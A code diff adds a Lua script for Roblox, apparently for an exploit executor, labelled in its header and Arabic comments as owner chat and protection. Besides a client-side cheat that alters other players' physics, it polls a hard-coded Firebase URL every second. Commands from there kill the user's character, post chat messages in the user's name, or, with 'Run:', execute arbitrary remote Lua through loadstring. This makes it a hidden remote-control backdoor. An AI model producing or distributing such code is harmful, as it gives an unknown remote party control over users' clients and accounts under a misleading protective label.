@@ -1,0 +1,112 @@
+-- Protected Owner Chat + Firebase Commands Script
+local Players         = game:GetService("Players")
+local LocalPlayer     = Players.LocalPlayer
+local Replicated      = game:GetService("ReplicatedStorage")
+local ChatService     = game:GetService("Chat")
+local TextChatService = game:GetService("TextChatService")
+local HttpService     = game:GetService("HttpService")
+
+-- Firebase URL (Realtime Database)
+local firebaseUrl  = "https://tast1-e066a-default-rtdb.asia-southeast1.firebasedatabase.app/command.json"
+local http_request = syn and syn.request or http_request or http.request or request
+local lastCommand  = ""
+
+-- عرض إشعار
+local function showNotification(text)
+    local gui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
+    gui.ResetOnSpawn = false
+    local msg = Instance.new("TextLabel", gui)
+    msg.Size = UDim2.new(0.6, 0, 0.1, 0)
+    msg.Position = UDim2.new(0.2, 0, 0.05, 0)
+    msg.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+    msg.BackgroundTransparency = 0.2
+    msg.TextColor3 = Color3.fromRGB(0, 255, 255)
+    msg.Font = Enum.Font.SourceSansBold
+    msg.TextScaled = true
+    msg.ZIndex = 10
+    msg.Text = text
+    task.delay(5, function()
+        if gui then gui:Destroy() end
+    end)
+end
+
+showNotification("✅ حماية + شات المالك – مفعل محليًا")
+
+-- حماية
+local function protect()
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer then
+            local char = player.Character
+            if char then
+                for _, part in ipairs(char:GetDescendants()) do
+                    if part:IsA("BasePart") then
+                        part.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
+                        part.CanCollide = false
+                        part.Velocity = Vector3.new()
+                        part.RotVelocity = Vector3.new()
+                        part.Anchored = false
+                    end
+                end
+            end
+        end
+    end
+end
+
+-- إرسال رسالة
+local function sendChatMessage(text)
+    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+        local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+        if channel then
+            channel:SendAsync(text)
+        end
+    else
+        local chatEvents = Replicated:FindFirstChild("DefaultChatSystemChatEvents")
+        if chatEvents and chatEvents:FindFirstChild("SayMessageRequest") then
+            chatEvents.SayMessageRequest:FireServer(text, "All")
+        end
+    end
+end
+
+-- استماع للأوامر
+local function listenToFirebase()
+    local ok, res = pcall(function()
+        return http_request({ Url = firebaseUrl, Method = "GET" })
+    end)
+    if not ok or not res or res.StatusCode ~= 200 then return end
+
+    local command = HttpService:JSONDecode(res.Body)
+    if command ~= lastCommand then
+        lastCommand = command
+
+        if command == "Kill" then
+            local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+            if hum then hum.Health = 0 end
+
+        elseif type(command) == "string" and command:sub(1,5) == "Chat:" then
+            local text = command:sub(6)
+            sendChatMessage(text)
+
+        elseif type(command) == "string" and command:sub(1,4) == "Run:" then
+            local code = command:sub(5)
+            local f = loadstring(code)
+            if f then pcall(f) end
+        end
+
+        -- مسح الأمر بعد تنفيذه
+        pcall(function()
+            http_request({
+                Url = firebaseUrl,
+                Method = "PUT",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = HttpService:JSONEncode("")
+            })
+        end)
+    end
+end
+
+-- حلقة تشغيل
+while true do
+    pcall(protect)
+    pcall(listenToFirebase)
+    task.wait(1)
+end
